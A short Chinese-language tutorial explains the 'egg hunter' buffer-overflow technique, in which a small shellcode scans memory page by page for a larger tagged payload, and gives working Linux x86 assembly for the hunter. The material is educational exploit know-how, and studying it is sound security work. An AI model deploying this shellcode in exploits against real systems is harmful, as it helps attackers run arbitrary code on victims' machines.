## Egg Hunter

Egg Hunter由两部分组成，一部分是Egg，一部分是Hunter。在溢出的场景中，溢出的字节有限的情况下，比较大的shellcode(Egg)塞不进去，那就把大的shellcode放到内存的其他地方，在有限的溢出空间中用小的shellcode(Hunter)，去寻找大的shellcode来执行。

Egg就是大的shellcode，Hunter就是小的shellcode。类比于web漏洞挖掘中的“小马传大马”。

## 基本原理

1) 内存扫描

Linux下使用access、sigaction等内核函数来做判断，如果地址不可访问，这些函数会返回0xf2。
Windows下也有类似的函数，如IsBadReadPtr、NtDisplayString函数。

如果当前地址不可访问，则跳到下一个内存页。因为内存一般都是4k大小页对齐的，所以当前地址无法访问则可以判定该地址所在内存页都无法访问，可以提高扫描速度。

2) 对比关键字

不采用shellcode的前几个字节作为标记（不够独特），由我们自己指定标记，且为了避免检索到hunter页自身的标记，我们需要在设置egg页标记时应该重复两次。Hunter在比较的时候，连续比较两次标记，则认为找到Egg。

## 代码

* Linux egg code :

```c
_start:
xor ecx, ecx
mul ecx

next_page:
or dx, 0xfff  // 4kb=0x1000
inc edx

lea ebx, [edx]
xor eax, eax
mov al, 0x21
int 0x80  // call access

cmp al, 0xf2  
jz next_page

call here

.string "\x31\x31\x31\x31" // compare sign

here:
pop eax
mov eax, [eax]
mov edi, edx
scasd
// scasd   eax,DWORD PTR es:[edi] -> edi+4
jnz next_page

scasd
jnz next_page  // repeat compare sign 


find:

jmp edi

```